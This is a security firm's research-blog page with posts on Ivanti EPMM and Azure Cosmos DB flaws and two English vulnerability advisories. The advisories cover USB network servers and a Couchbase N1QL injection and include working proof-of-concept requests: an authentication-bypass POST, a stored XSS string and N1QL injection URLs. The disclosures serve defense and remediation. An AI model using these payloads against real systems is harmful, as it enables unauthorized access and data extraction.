[27. Juli 202310. August 2023](https://research.hisolutions.com/2023/07/eine-10-von-10-ivanti-cve-2023%E2%80%9135078-hilfe-zur-selbsthilfe/)[Advisories](https://research.hisolutions.com/category/advisories/), [Cyberwar](https://research.hisolutions.com/category/themen/cyberwar/), [Incidents](https://research.hisolutions.com/category/themen/incidents/), [Schwachstelle](https://research.hisolutions.com/category/themen/schwachstelle/), [Zeroday](https://research.hisolutions.com/category/themen/zeroday/)
## [Eine 10 von 10 – Ivanti CVE-2023‑35078 – Hilfe zur Selbsthilfe](https://research.hisolutions.com/2023/07/eine-10-von-10-ivanti-cve-2023%E2%80%9135078-hilfe-zur-selbsthilfe/)

---

**Update vom 10.08.2023:**

Für Ivanti Endpoint Manager Mobile (EPMM) wurde am 03.08.2023 eine weitere Schwachstelle ([CVE‑2023-35082](https://forums.ivanti.com/s/article/CVE-2023-35082-Remote-Unauthenticated-API-Access-Vulnerability-in-MobileIron-Core-11-2-and-older?language=en_US)) mit einer CVSS-Bewertung von 10.0 veröffentlicht. Die Schwachstelle ist ähnlich zu der initial veröffentlichen CVE-2023-35078. Am 07.08.2023 hat Invanti veröffentlicht, dass diese Schwachstelle alle Versionen von EPMM betrifft. Die Maßnahmen zum Schließen der Schwachstelle und einer Identifizierung eines Angriffs wurden in dem Dokument „Hilfe zur Selbsthilfe – CVE‑2023‑35078“ ergänzt.

---

**Update vom 01.08.2023:**

Auf Basis der bereits veröffentlichten Expoits konnte der String zur Identifizierung eines Angriffs genauer bestimmt werden. Diese finden Sie in dem Dokument „Hilfe zur Selbsthilfe – CVE-2023 35078“ unter dem Punkt 2.

---

**Update vom 31.07.2023:**

Seit dem Wochenende gibt es die ersten öffentlichen Proof of Concept Exploits auf GitHub. Die teilweise in Python geschriebenen Programme ermöglichen eine automatische Ausnutzung der Ivanti Schwachstelle CVE-2023-35078.

Zusätzlich wurde am 28.07.2023 von Ivanti eine weitere [Sicherheitslücke](https://research.hisolutions.com/2023/06/eine-sicherheitsluecke-ausnutzen-um-eine-sicherheitsfunktion-umzusetzen/) ([CVE-2023-35081](https://forums.ivanti.com/s/article/CVE-2023-35081-Arbitrary-File-Write?language=en_US)) publiziert. Hierbei handelt es sich um eine Schwachstelle welche es dem Angreifer erlaubt als authentifizierten Administrator beliebige Schreibvorgänge auf dem EPMM-Server durchzuführen.

---

Am 24. Juli 2023 hat der Hersteller Ivanti Informationen zu der [Sicherheitslücke CVE-2023‑35078](https://forums.ivanti.com/s/article/CVE-2023-35078-Remote-unauthenticated-API-access-vulnerability?language=en_US)  veröffentlicht. Die Schwachstelle betrifft die Software „Ivanti Endpoint Manager Mobile“ (EPMM), auch bekannt als MobileIron Core. Um unseren Kunden eine Möglichkeit zu geben, erste Maßnahmen zu ergreifen und ihre Systeme zu prüfen, haben wir einen Leitfaden „Hilfe zur Selbsthilfe – CVE-2023‑35078“ erstellt. Der Leitfaden kombiniert die öffentlichen Informationen der staatlichen Sicherheitsbehörden, Fach-Blogs und die Angaben des Herstellers mit der Expertise der HiSolutions.

Sollten Sie Ivanti bzw. MobileIron Core nutzen, prüfen Sie bitte anhand des Dokuments, ob Sie alle relevanten Maßnahmen ergriffen haben.

**HINWEIS:** Das Dokument wird laufend aktualisiert. Bitte achten Sie daher auch auf weitere Veröffentlichungen auf unserem Research-Blog. Weitere Informationen und Cybersicherheitswarnungen erhalten Sie auch beim Bundesamt für Sicherheit in der Informationstechnik ([BSI](https://research.hisolutions.com/2023/07/kontinuierlich-weiterentwickelt-der-neue-bsi-standard-200-4-zum-bcm/)) unter <https://www.bsi.bund.de/SiteGlobals/Forms/Suche/BSI/Sicherheitswarnungen/Sicherheitswarnungen_Formular.html>

---

[HiSolutions-Selbsthilfe-CVE-2023-35078-1](https://research.hisolutions.com/wp-content/uploads/2023/08/HiSolutions-Selbsthilfe-CVE-2023-35078-1.pdf)[Herunterladen](https://research.hisolutions.com/wp-content/uploads/2023/08/HiSolutions-Selbsthilfe-CVE-2023-35078-1.pdf)

[![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2021/08/nasa-0DjOJ6Q8wUs-unsplash.jpg)](https://research.hisolutions.com/2021/08/keine-gaudi-fast-super-cloud-gau-bei-microsoft/ "Keine Gaudi: Fast Super-Cloud-GAU bei Microsoft")

[30. August 2021](https://research.hisolutions.com/2021/08/keine-gaudi-fast-super-cloud-gau-bei-microsoft/)[Cloud](https://research.hisolutions.com/category/themen/cloud/)
## [Keine Gaudi: Fast Super-Cloud-GAU bei Microsoft](https://research.hisolutions.com/2021/08/keine-gaudi-fast-super-cloud-gau-bei-microsoft/)

Bei Microsoft ist eingetreten, wovor sich viele Cloud-Anbieter insgeheim fürchteten: Getroffen hat es Azure mit seiner Cosmos DB, einer beliebten NoSQL-Datenbank. Das Datenbankmanagement wird dabei ganz im Sinn von PaaS weitgehend von Microsoft übernommen.

Nun haben Sicherheitsforscher eine Schwachstelle in der Funktion Jupyter-Notebook entdeckt. Dieses Feature war erst im Februar diesen Jahres durch Microsoft aktiviert worden. Der Vorgang zeigt, wie wichtig es ist, die Konfiguration in allen genutzten Cloud-Diensten beständig im Blick zu behalten und gerade neue Features sicherheitstechnisch kritisch zu bewerten.

Die Entdecker WIZ Research haben zur Schwachstelle folgendes Video erstellt:

Eine Webseite mit Informationen zur Schwachstelle ist hier zu finden: <https://chaosdb.wiz.io/>

Laut Microsoft kam es glücklicherweise nicht zu einem aktiven Ausnutzen dieser Schwachstelle, siehe folgende Stellungnahme:

> [Update on the vulnerability in the Azure Cosmos DB Jupyter Notebook Feature](https://msrc-blog.microsoft.com/2021/08/27/update-on-vulnerability-in-the-azure-cosmos-db-jupyter-notebook-feature/)

Positiv hervorzuheben ist, dass nur zwei Tage nach Meldung der [Sicherheitslücke](https://research.hisolutions.com/2023/06/eine-sicherheitsluecke-ausnutzen-um-eine-sicherheitsfunktion-umzusetzen/) das betroffene Jupyter-Notebook-Feature durch Microsoft deaktiviert wurde, sowie der offene Umgang mit der Schwachstelle.

## Fix Once, Secure Everywhere

Dies zeigt einen weiteren Vorteil der Cloud: Wenn eine Schwachstelle im Zuständigkeitsbereich des Cloud-Anbieters liegt, muss diese in der Regel nur durch den Cloud-Anbieter gefixt werden. Auf der anderen Seite ist dies auch ein Unterscheidungsmerkmal in Bezug auf Anbieterqualität: Nur ein Cloud-Anbieter, der schnell reagiert, bietet den Kundendaten entsprechenden Schutz.

## CV? Neee…

Leider gibt es – [anders als für Schwachstellen in Anwendungen und Betriebssystemen](https://cve.mitre.org/) – keine dedizierte Datenbank für Schwachstellen in Cloud-Diensten. Denn CVE-Nummer werden nur vergeben, wenn die die Software durch den Kunden kontrollier- bzw. installierbar ist (<https://cloudsecurityalliance.org/blog/2018/08/13/cve-cloud-services-part-1/>).

[![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2018/10/cropped-HiS_Logo_HintergrungWeiss-1_Research.jpg)](https://research.hisolutions.com/2020/07/high-impact-vulnerabilites-in-multiple-usb-network-servers/ "High-Impact Vulnerabilites In Multiple USB Network Servers")

[15. Juli 20205. August 2020](https://research.hisolutions.com/2020/07/high-impact-vulnerabilites-in-multiple-usb-network-servers/)[Advisories](https://research.hisolutions.com/category/advisories/)
## [High-Impact Vulnerabilites In Multiple USB Network Servers](https://research.hisolutions.com/2020/07/high-impact-vulnerabilites-in-multiple-usb-network-servers/)

Within the scope of a recent penetration test and through individual research effort, HiSolutions‘ security consultants discovered multiple previously unknown high-impact vulnerabilities in USB network server firmwares (see individual issues for the CVE IDs). Devices of multiple vendors were affected by similar vulnerabilities. HiSolutions responsibly disclosed the vulnerabilities to the vendors and additionally provided feedback on the implemented patches.

## Background Information

USB network servers or USB network MTP and printer servers are devices that can be used to make USB devices accessible to multiple users via the network. Users install a software on their client and can then access USB devices without the need to physically plug the device into the local system. If devices are used by multiple users the devices do not have to be transfered between different systems each time the user changes. Use cases include shared USB network drives, USB Printers, or USB license dongles that can be used by authenticated users on the local network. All of the investigated devices were provided with an individual client software that runs on the local systems. All systems also exposed a web server that could be used to make administrative changes to the system.

## The Vulnerabilities

HiSolutions consultants discovered four noteable vulnerabilities in each of the investigated devices.
The devices were:

* TP-Link TL-PS310U (version v2.000, fixed in 2.079.000.t0210)
* Digitus da-70254 (version 2.073.000.E0008)
* Lindy No. 42633 (version v.2.078.000)
* one other reviewed device of an (at this time) undisclosed vendor

### Exposure of the Administrative Password Over Network Broadcast

*The following CVE IDs were issued for this vulnerability: CVE-2020-15054 (TP-Link), CVE-2020-15058 (Lindy), CVE-2020-15062 (Digitus).*

The USB network servers send the password of the local administrator account repeatedly and without request across the local Network via UDP broadcast. Every system on that network can read the password from these unencrypted broadcasts. The password is sent in UDP packets to the broadcast address 255.255.255.255 as can be seen in the following packet capture:

![wireshark packet capture screenshot of administrative password in udp network traffic](data:image/gif;base64...)![wireshark packet capture screenshot of administrative password in udp network traffic](https://research.hisolutions.com/wp-content/uploads/2020/07/administrative-password-in-udp-network-traffic.jpg)
Figure 1: UDP broadcast of the administrative password „PASSWORDABC“.

All systems in the local network receive the administrative password. In theory, the password is then used to locally check against the password entered by the client on the local system. In practice, an attacker can easily retrieve the password from the UDP broadcast messages and thus
circumvent the access restrictions to the administrative interface. The attacker then can use all functions provided by the USB network server, including restricted ones. If the password is reused (which is strongly discouraged but often the case) this design error could give an attacker access to other systems that use the same password.

### Authentication Bypass in Web Administration Interface

*The following CVE IDs were issued for this vulnerability: CVE-2020-15055 (TP-Link), CVE-2020-15059 (Lindy), CVE-2020-15063 (Digitus).*

In some cases the password authentication requirement in the web interface can be bypassed when the password parameter is removed from the request. This enables an unauthenticated user to access privileged functions on the interface.
As an example, the following request will change the server name, a functionality that would normally only be available if the configured password was provided:

```
POST /csystem33.htm HTTP/1.1
Host: 192.168.0.10
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101
Firefox/60.0
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.0.10/csystem33.htm
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Connection: close
Upgrade-Insecure-Requests: 1
```
```
%24A0%24=New+Name+No+Password&%24B2%24=38&%24B3%24=39
```

As is visible in the request, no password is provided and the corresponding Parameter is removed entirely. Without the password parameter the authentication does not fail, but instead the server simply implies that no password was set, thus allowing the operation without any user authentication.

Because of that, unauthenticated users can access administrative functions on the system without knowledge of the administrative password, therefore bypassing the authentication. This effectively disables the access control for the entire administrative interface.

### Persistent Cross-Site Scripting

*The following CVE IDs were issued for this vulnerability: CVE-2020-15056 (TP-Link), CVE-2020-15060 (Lindy), CVE-2020-15064 (Digitus).*

The parameter for the server name is vulnerable to a stored Cross-Site Scripting ([XSS](https://research.hisolutions.com/2023/04/xss-auf-abwegen/)) attack. This results in the possibility for an attacker to execute JavaScript code in the context of the victims browser.

If the corresponding request is sent to the server, the server name gets embedded into the JavaScript file unfiltered and unescaped:

```
var myServer = new Server();
myServer.model = '';
myServer.manuf = '';
myServer.name = 'TestName';alert('Successful XSS');//';
myServer.hw = 'V. 2.000';
//myServer.tempFW = '2.255.255';
tempFWVersion = '';
myServer.fw = tempFWVersion.substring(0,1) + '.' +
tempFWVersion.substring(1,3);
myServer.mac = '34:e8:94:20:47:78';
```

The vulnerability allows attackers to execute JavaScript code in the context of the browser of the victim by manipulating the stored server name. Attackers in the local network could insert a custom script that is loaded each time an administrator visits the web administration interface. They can thereby gain persistent access to the web interface and attack other systems in the local network through the browser of the victim.
Normally, administrative access to the web interface would be needed to [exploit](https://research.hisolutions.com/2023/03/wir-nehmen-rtf-da-gibt-es-keine-makros-dafuer-aber-einen-exploit/) this vulnerability, which would lower the impact. In combination with other vulnerabilities (like the authentication bypass) this exploit works for all users with access to the system.

### Denial of Service

*The following CVE IDs were issued for this vulnerability: CVE-2020-15057 (TP-Link), CVE-2020-15061 (Lindy), CVE-2020-15065 (Digitus).*

Users can crash the USB network servers by sending long input values. For some lengths, the servers hang or act unexpectedly. while longer input values (e.g. 1103 characters) will crash them entirely. A reboot or sometimes reset of the device is needed to clear the issue.

After receiving too long input values the system no longer responds to network requests. The UDP broadcasts show that when setting a long server name other variables were most likely overwritten:

![Wireshark packet capture screenshot of the buffer overflow from the server name](data:image/gif;base64...)![Wireshark packet capture screenshot of the buffer overflow from the server name](https://research.hisolutions.com/wp-content/uploads/2020/07/USB-Abb3.jpg)
Figure 2: Buffer overflow from the server name (top: normal, bottom: after attack)

An attacker can use the buffer overflow vulnerability to impact the availability of the server. The shown behaviour indicates that the buffer overflow could also be used to execute functions or code on the system. This possibility was not investigated during the project.

## Remediation

The vendors TP-Link and Lindy provided an updated firmware that fixes the vulnerabilities.

When using a device for which no patch is available, make sure that the chosen password is not reused on any other system or application.
Access to the devices could also be restricted on network level to limit the possibility of an attacker accessing the web interface or sniffing the broadcast traffic.

## Responsible Disclosure Timeline

The vulnerabilities were reported to each of the vendors via e-mail. It was made clear that HiSolutions will follow defined [responsible disclosure](https://research.hisolutions.com/2023/02/wenn-der-white-hat-hacker-anruft-aber-niemand-rangeht/) policy and aims to release information about the vulnerabilities in coordination with the vendor.
Each but one vendor reacted to the initial contact and in the following dialogue was provided with additional information on the vulnerabilities.
The vendors named in this advisory provided patches to mitigate the security issues. Hisolutions tested the patches for their effectiveness until the discovered vulnerabilities were closed and follow-up problems solved adequately.

[![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2019/06/Couchbase_Inc._official_logo.png)](https://research.hisolutions.com/2019/06/n1ql-injection-in-couchbase-sync-gateway-cve-2019-9039/ "N1QL Injection in Couchbase Sync Gateway – CVE-2019-9039")

[21. Juni 201926. Juni 2023](https://research.hisolutions.com/2019/06/n1ql-injection-in-couchbase-sync-gateway-cve-2019-9039/)[Advisories](https://research.hisolutions.com/category/advisories/)
## [N1QL Injection in Couchbase Sync Gateway – CVE-2019-9039](https://research.hisolutions.com/2019/06/n1ql-injection-in-couchbase-sync-gateway-cve-2019-9039/)

Within the scope of a recent penetration test, HiSolutions security consultants encountered a Couchbase Sync Gateway and discovered a previously unknown, high-impact injection vulnerability (CVE-2019-9039).

**Background
Information**

The Couchbase Sync Gateway is a product
developed by Couchbase Inc. as part of their mobile product portfolio. It is
used to connect web, mobile, and IoT apps (Couchbase Lite) to the backend
database (Couchbase Server). The publically accessible Sync Gateway synchronizes
the data with the internal backend database servers and employs various
security and integration features.

Couchbase uses a database query language called *N1QL* (<https://www.couchbase.com/products/n1ql> ) (pronounced “nickel”). *N1QL* extends SQL for JSON. It
combines the syntax of traditional SQL with the benefits and flexibility of
NoSQL databases.

From a security standpoint, N1QL is comparatively
unexplored. SQL injections are a well-known and broadly explored security risk
for traditional SQL databases. With increased use of NoSQL databases, NoSQL injection
has become a more widely known topic as well. For both vulnerabilities,
numerous tools, articles and presentations exist that detail every aspect of
exploitation.

**N1QL
Injections**

A 2015 blog post (<https://blog.couchbase.com/couchbase-and-n1ql-security-centeredgesoftware/>) discusses various aspects of N1QL injections. N1QL is claimed to be more
resistant to injection attacks than traditional SQL. This is due to the
following syntactic differences:

* Query stacking is not possible
  in N1QL. That is, terminating a previous query with a semicolon and appending
  another query will result in an invalid syntax error in N1QL.
* N1QL does not allow commenting
  out just the remainder of a line. N1QL only allows C-style comment blocks (/\*
  comment \*/). This prevents an attacker from terminating a query by inserting
  “/\*” or “–“ at the injection point.

The blog post also mentions generic advice for
preventing injections. Apart from that, information regarding N1QL injections
is very sparse.

**The vulnerability**

HiSolutions consultants discovered that the Couchbase
Sync Gateway in combination with a Couchbase Server is affected by a previously
undisclosed N1QL-injection vulnerability in the REST API. An attacker with
access to the public REST API can insert additional N1QL statements through the
parameters “startkey” and “endkey” of the “\_all\_docs” endpoint.

The following request triggers an error:

[https://host:port/{db}/\_all\_docs?startkey=1%271&endkey=](https://host:port/%7Bdb%7D/_all_docs?startkey=1%271&endkey=)

The client will receive the following error statement
indicating a N1QL error:

```
{"rows":[
{"error":"Internal Server Error","reason":"Internal error: [3000] syntax error - at 1"}
```

On a server with the standard installation of Couchbase
Server and Couchbase Sync Gateway, the following error will appear in the
logfile:

```
2019-02-15T14:00:51.892+01:00 [WRN] Error when querying index using
statement: [SELECT META(`test-getting-started`).id as id,
meta(`test-getting-started`).xattrs._sync.rev as r,
meta(`test-getting-started`).xattrs._sync.sequence as s,
meta(`test-getting-started`).xattrs._sync.channels as c FROM
`test-getting-started` WHERE meta(`test-getting-started`).xattrs._sync.sequence
> 0 AND META(`test-getting-started`).id NOT LIKE '\\_sync:%' AND
meta(`test-getting-started`).xattrs._sync IS NOT MISSING AND
(meta(`test-getting-started`).xattrs._sync.flags IS MISSING OR
BITTEST(meta(`test-getting-started`).xattrs._sync.flags,1) = false) AND
META(`test-getting-started`).id >= '1'1' ORDER BY META(`test-getting-started`).id] --
base.(*CouchbaseBucketGoCB).Query() at bucket_n1ql.go:63
```

The error (injection point at ‚1‘1′ near the bottom) shows that it is possible to break out of the original query and insert additional N1QL code. An additional character after the apostrophe seems to be required to trigger the error.

Furthermore, it is possible to end the current query
and thereby skip the rest of the original query by inserting a null byte at the
end of the manipulated parameter value.

The insertion of an additional comparison can be used
to validate the injection. When inserting an additional requirement that is
always true (“AND 1=1”), the original results are returned:

```
/{db}/_all_docs?startkey=123%27%20AND%201%3d1%00&endkey=
```

Inserting a statement that always evaluates to false (“AND
1=0”) yields no results:

```
/{db}/_all_docs?startkey=123%27%20AND%201%3d0%00&endkey=
```

The following request can be used to extract
additional information from a default installation:

```
/{db}/_all_docs?startkey=123%27%20UNION%20ALL%20SELECT
%20TOSTRING(BASE64_DECODE("U1FMLUl
uamVjdGlvbg=="))%20as%20id%3b%00&endkey=
```

The inserted N1QL statement “UNION ALL SELECT
TOSTRING(BASE64\_DECODE(„U1FMLUluamVjdGlvbg==“)) as id” adds the
following line to the output and shows that N1QL functions and queries are
evaluated:

```
{"rows":[
{"key":"SQL-Injection","id":"SQL-Injection","value":{"rev":""}}
...
```

The same injection works for the parameter “endkey”.

Additional modification of the query seems to be
required to make UNION-injections work when channels and users are set up for
the database. Data extraction methods that rely on comparisons will work as shown.

**Impact:**

An attacker with access to the public REST API is able
to issue additional N1QL statements and extract sensitive data or call
arbitrary N1QL functions. By issuing nested queries with CPU-intensive
operations, he might be able to cause increased resource usage and denial of
service conditions.

**Remediation:**

Traditional remediations for SQL injection vulnerabilities
also apply to N1QL. Features like parameterized N1QL queries should be used to
prevent the injection of N1QL statements into the original query.

As the vulnerability exists in the default Couchbase
Sync Gateway, an update will fix the problem. HiSolutions has responsibly reported
the issue to the vendor. The fix is available in Sync Gateway v2.5 as well as
in v2.1.3.

Short-term remediation can be implemented by blocking
all requests containing “startkey” or “endkey” on the web-interface.

**[Responsible Disclosure](https://research.hisolutions.com/2023/02/wenn-der-white-hat-hacker-anruft-aber-niemand-rangeht/) Timeline**

15.02.2019 – HiSolution initially notifies security@couchbase.com with vulnerability details and the internal
responsible disclosure guideline.

20.02.2019 – Couchbase acknowledges the vulnerability
and states that an engineering team is working on the issue. Couchbase offers
to help with the CVE request to [MITRE](https://research.hisolutions.com/2023/03/medientipp-maerz-2023/).

23.02.2019 – HiSolutions inquires whether the
engineering team was able to reproduce the issue and requests an ETA for a
patch. HiSolutions notifies Couchbase that a CVE number was requested.

23.02.2019 – MITRE assigns CVE-2019-9039 for the
vulnerability.

26.02.2019 – Couchbase sends an email to HiSolutions with
their assessment of the CVSS (<https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:L>). Couchbase states in this email that a patch is under
development and that they will follow up with an ETA. Couchbase requests the
CVE number.

26.02.2019 – HiSolutions sends the CVE number to
Couchbase and questions the assessed CVSS. User interaction should be “none”
from HiSolutions perspective (CVSS v3 Vector: [AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:L](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:L)).

26.02.2019 – Couchbase explains their assessment of
the CVSS and states that they will follow up an ETA for the patch.

25.03.2019 – HiSolutions inquires  if an ETA is available and explains the
assessment of the User Interaction CVSS vector.

12.04.2019 – HiSolutions inquires if the last email
was received successfully. HiSolutions reminds Couchbase that the issue is
scheduled for disclosure on 21.05.2019 and request to be notified if more time
is needed by Couchbase.

15.04.2019 – Couchbase apologizes for the delayed
response. The patch for the Sync Gateway is expected at the end of April. Couchbase
agrees to a public disclosure on 21.05.2019. Couchbase informs HiSolutions that
they will list the issue on a changed website under <https://www.couchbase.com/resources/security> within a table containing all vulnerabilities, fix release dates, versions,
and affected products.

14.05.2019 – HiSolutions notices that the patch is
applied in the latest public version. HiSolutions sends an inquiry regarding
the vulnerability table on the website and if 21.05.2019 is still good for the
disclosure.

21.05.2019 – HiSolutions postpones the disclosure
because no answer was received.

11.06.2019 – HiSolutions inquires regarding the table
on the website and a new disclosure date. A delivery failure for the contact
address of the initial contact within the security team is received. The email is
resent to the security team with the request for an answer by another team
member.

12.06.2019 – Couchbase replies that the fix is
included in Sync Gateway v2.5 as well as in v2.1.3. The release notes for both
products will be updated in the following days to include a reference to the
vulnerability. Couchbase is actively working on the vulnerability table. While
unclear if the table will be finished until 21.06.2019, HiSolutions can
disclose the issue on 21.06.2019 if Couchbase has updated the release release
notes until then.

**Further references**

<https://docs.couchbase.com/dotnet-sdk/2.2/prepared-statements.html> <https://docs.couchbase.com/java-sdk/2.7/n1ql-query.html#devguide-named-placeholders>

* [Elektronische Patientenakte (ePA): nicht so sicher](https://research.hisolutions.com/2025/01/elektronische-patientenakte-epa-nicht-so-sicher/)16. Januar 2025
* [NSO vs. Whatsapp](https://research.hisolutions.com/2025/01/nso-vs-whatsapp/)16. Januar 2025
* [Windows-BitLocker-Probleme](https://research.hisolutions.com/2025/01/windows-bitlocker-probleme/)16. Januar 2025
* [Wahlsoftware 2.0](https://research.hisolutions.com/2025/01/wahlsoftware-2-0/)16. Januar 2025
* [Kritische Abhängigkeiten in unserem (digitalen) Alltag](https://research.hisolutions.com/2024/12/kritische-abhaengigkeiten-in-unserem-digitalen-alltag/)12. Dezember 2024
* [iOS 18: Sicherheitsfeatures und Mythen über Mobilgeräte](https://research.hisolutions.com/2024/12/ios-18-sicherheitsfeatures-und-mythen-ueber-mobilgeraete/)12. Dezember 2024
* [Technische Geräte und Remote-Zugriffe durch Hersteller](https://research.hisolutions.com/2024/12/technische-geraete-und-remote-zugriffe-durch-hersteller/)12. Dezember 2024
* [DDoS-Attacke auf das Internet Archive: Ein Schlag gegen die digitale Bewahrung](https://research.hisolutions.com/2024/11/ddos-attacke-auf-das-internet-archive-ein-schlag-gegen-die-digitale-bewahrung/)14. November 2024
* [Das Passwort in der Excel-Tabelle](https://research.hisolutions.com/2024/11/das-passwort-in-der-excel-tabelle/)14. November 2024
* [Hackerparagraph: Neue Version, alte Probleme](https://research.hisolutions.com/2024/11/hackerparagraph-neue-version-alte-probleme/)14. November 2024
* [Seitenkanal des Monats: Wenn die Handy-Rückseite vibriert](https://research.hisolutions.com/2024/11/seitenkanal-des-monats-wenn-die-handy-rueckseite-vibriert/)14. November 2024
* [Sieht der Fernseher mit?](https://research.hisolutions.com/2024/10/sieht-der-fernseher-mit/)17. Oktober 2024

[Angriff](https://research.hisolutions.com/tag/angriff/)
[Black hat](https://research.hisolutions.com/tag/black-hat/)
[Browser](https://research.hisolutions.com/tag/browser/)
[BSI](https://research.hisolutions.com/tag/bsi/)
[Cloud](https://research.hisolutions.com/tag/cloud/)
[Corona](https://research.hisolutions.com/tag/corona/)
[CVE](https://research.hisolutions.com/tag/cve/)
[Cyberangriff](https://research.hisolutions.com/tag/cyberangriff/)
[Cyberattacken](https://research.hisolutions.com/tag/cyberattacken/)
[Cybersecurity](https://research.hisolutions.com/tag/cybersecurity/)
[Datenschutz](https://research.hisolutions.com/tag/datenschutz/)
[Emotet](https://research.hisolutions.com/tag/emotet/)
[Exchange](https://research.hisolutions.com/tag/exchange/)
[Hacker](https://research.hisolutions.com/tag/hacker/)
[Hackerangriff](https://research.hisolutions.com/tag/hackerangriff/)
[HAFNIUM](https://research.hisolutions.com/tag/hafnium/)
[Incident Response](https://research.hisolutions.com/tag/incident-response/)
[KI](https://research.hisolutions.com/tag/ki/)
[KRITIS](https://research.hisolutions.com/tag/kritis/)
[Künstliche Intelligenz](https://research.hisolutions.com/tag/kuenstliche-intelligenz/)
[Linux](https://research.hisolutions.com/tag/linux/)
[Malware](https://research.hisolutions.com/tag/malware/)
[Microsoft](https://research.hisolutions.com/tag/microsoft/)
[Pandemie](https://research.hisolutions.com/tag/pandemie/)
[Passwort](https://research.hisolutions.com/tag/passwort/)
[Penetrationstest](https://research.hisolutions.com/tag/penetrationstest/)
[Phishing](https://research.hisolutions.com/tag/phishing/)
[ProxyLogon](https://research.hisolutions.com/tag/proxylogon/)
[Quantencomputer](https://research.hisolutions.com/tag/quantencomputer/)
[Ransomware](https://research.hisolutions.com/tag/ransomware/)
[Safety](https://research.hisolutions.com/tag/safety/)
[Schadsoftware](https://research.hisolutions.com/tag/schadsoftware/)
[Schwachstelle](https://research.hisolutions.com/tag/schwachstelle/)
[Security](https://research.hisolutions.com/tag/security/)
[Server](https://research.hisolutions.com/tag/server/)
[Shitrix](https://research.hisolutions.com/tag/shitrix/)
[Sicherheitslücken](https://research.hisolutions.com/tag/sicherheitsluecken/)
[Supply Chain Security](https://research.hisolutions.com/tag/supply-chain-security/)
[Trojaner](https://research.hisolutions.com/tag/trojaner/)
[Verschlüsselung](https://research.hisolutions.com/tag/verschluesselung/)
[Vulnerability](https://research.hisolutions.com/tag/vulnerability/)
[Zeroday](https://research.hisolutions.com/tag/zeroday/)

* [Advisories](https://research.hisolutions.com/category/advisories/) (25)
* [Allgemein](https://research.hisolutions.com/category/allgemein/) (72)
* [Digital Workplace](https://research.hisolutions.com/category/digital-workplace/) (1)
* [Forensics](https://research.hisolutions.com/category/forensics/) (1)
* [ITSM](https://research.hisolutions.com/category/itsm/) (1)
* [News](https://research.hisolutions.com/category/news/) (393)
* [Publikationen](https://research.hisolutions.com/category/publikationen/) (4)
  + [Kolumne](https://research.hisolutions.com/category/publikationen/kolumne/) (2)
* [Themen](https://research.hisolutions.com/category/themen/) (115)
  + [Blockchain](https://research.hisolutions.com/category/themen/blockchain/) (2)
  + [Cloud](https://research.hisolutions.com/category/themen/cloud/) (9)
  + [Corona](https://research.hisolutions.com/category/themen/corona/) (4)
  + [Cyberwar](https://research.hisolutions.com/category/themen/cyberwar/) (7)
  + [ICS](https://research.hisolutions.com/category/themen/ics/) (1)
  + [Incidents](https://research.hisolutions.com/category/themen/incidents/) (18)
    - [Hafnium](https://research.hisolutions.com/category/themen/incidents/hafnium/) (10)
    - [Log4Shell](https://research.hisolutions.com/category/themen/incidents/log4shell/) (3)
  + [ISMS](https://research.hisolutions.com/category/themen/isms/) (1)
  + [KI/ML](https://research.hisolutions.com/category/themen/ki-ml/) (6)
  + [KMU](https://research.hisolutions.com/category/themen/kmu/) (1)
  + [Kritis](https://research.hisolutions.com/category/themen/kritis/) (6)
  + [Kryptographie](https://research.hisolutions.com/category/themen/kryptographie/) (7)
  + [Malware](https://research.hisolutions.com/category/themen/malware/) (5)
  + [Netzwerk](https://research.hisolutions.com/category/themen/netzwerk/) (7)
  + [OSINT](https://research.hisolutions.com/category/themen/osint/) (1)
  + [Passwörter](https://research.hisolutions.com/category/themen/passwoerter/) (4)
  + [Penetrationstest](https://research.hisolutions.com/category/themen/penetrationstest/) (7)
  + [Phishing](https://research.hisolutions.com/category/themen/phishing/) (3)
  + [Ransomware](https://research.hisolutions.com/category/themen/ransomware/) (8)
  + [Red Teaming](https://research.hisolutions.com/category/themen/red-teaming/) (1)
  + [Risikomanagement](https://research.hisolutions.com/category/themen/risikomanagement/) (6)
  + [SASE](https://research.hisolutions.com/category/themen/sase/) (1)
  + [Schwachstelle](https://research.hisolutions.com/category/themen/schwachstelle/) (26)
  + [Security Engineering](https://research.hisolutions.com/category/themen/security-engineering/) (7)
  + [Supply Chain](https://research.hisolutions.com/category/themen/supply-chain/) (3)
  + [Weiterbildung](https://research.hisolutions.com/category/themen/weiterbildung/) (2)
  + [Zeroday](https://research.hisolutions.com/category/themen/zeroday/) (6)
* [Threat Intelligence](https://research.hisolutions.com/category/threat-intelligence/) (1)
* [Veranstaltungen](https://research.hisolutions.com/category/veranstaltungen/) (3)
### Hier schreiben

* ![Abraham Söyler](data:image/gif;base64...)![Abraham Söyler](https://research.hisolutions.com/wp-content/uploads/2024/10/Abraham-Soeyler_Business-200x200.jpg)

  [Abraham Söyler](https://research.hisolutions.com/author/soeyler/ "Abraham Söyler")
* ![Cass Rebbelin](data:image/gif;base64...)![Cass Rebbelin](https://research.hisolutions.com/wp-content/uploads/2023/12/Cass-Rebbelin_Business-150x150.jpg)

  [Cass Rebbelin](https://research.hisolutions.com/author/rebbelin/ "Cass Rebbelin")
* ![Constantin Kirsch - HiSolutions AG](data:image/gif;base64...)![Constantin Kirsch - HiSolutions AG](https://research.hisolutions.com/wp-content/uploads/2024/05/Constantin-Kirsch_200x200_intern.jpg)

  [Constantin Kirsch](https://research.hisolutions.com/author/constantink/ "Constantin Kirsch")
* ![Daniel Jedecke - HiSolutions](data:image/gif;base64...)![Daniel Jedecke - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Daniel-Jedecke_200x200_intern.jpg)

  [Daniel Jedecke](https://research.hisolutions.com/author/jedi/ "Daniel Jedecke")
